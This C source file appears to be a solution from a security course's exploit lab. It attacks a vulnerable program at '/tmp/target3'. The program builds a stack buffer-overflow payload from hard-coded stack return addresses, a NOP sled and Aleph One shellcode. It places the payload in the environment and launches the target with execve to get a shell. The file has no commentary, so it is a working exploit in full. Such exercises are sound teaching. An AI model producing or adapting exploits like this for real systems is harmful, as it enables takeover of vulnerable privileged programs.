#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	char *args[3]; 
	char *env[1];

	int shellLen = strlen(shellcodeAlephOne);
	int A1 = 203;
	unsigned char esp[4];

	char bufferPtr[400] = {0x41};
	char strPtr[20] = {0x41};
	esp[3] = 0xbf; esp[2] = 0xff; esp[1] = 0xfc; esp[0] = 0xac;
	
	for(int i = 0; i < sizeof(strPtr);i+=4) {

		strPtr[i + 0] = esp[0];
		strPtr[i + 1] = esp[1];
		strPtr[i + 2] = esp[2];
		strPtr[i + 3] = esp[3];
	}

	for(int i = 0; i < sizeof(bufferPtr);i+=4) {

		bufferPtr[i + 0] = esp[0];
		bufferPtr[i + 1] = esp[1];
		bufferPtr[i + 2] = esp[2];
		bufferPtr[i + 3] = esp[3];
	}


	bufferPtr[3] = 0xbf; 
	bufferPtr[2] = 0xff; 
	bufferPtr[1] = 0xfc; 
	bufferPtr[0] = 0xb4;
	
	 
	bufferPtr[7] = 0xbf; 
	bufferPtr[6] = 0xff; 
	bufferPtr[5] = 0xfc; 
	bufferPtr[4] = 0xb8; 
	
	for(int i = 8; i < A1;i++)
	{
		bufferPtr[i] = 0x90;
	}

	for(int k = 0; k < shellLen; k++)
	{
		bufferPtr[A1 + k] = shellcodeAlephOne[k];
	}


	args[0] = TARGET;
	args[1] = strPtr; 
	args[2] = NULL;

	env[0]  = bufferPtr;
	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}


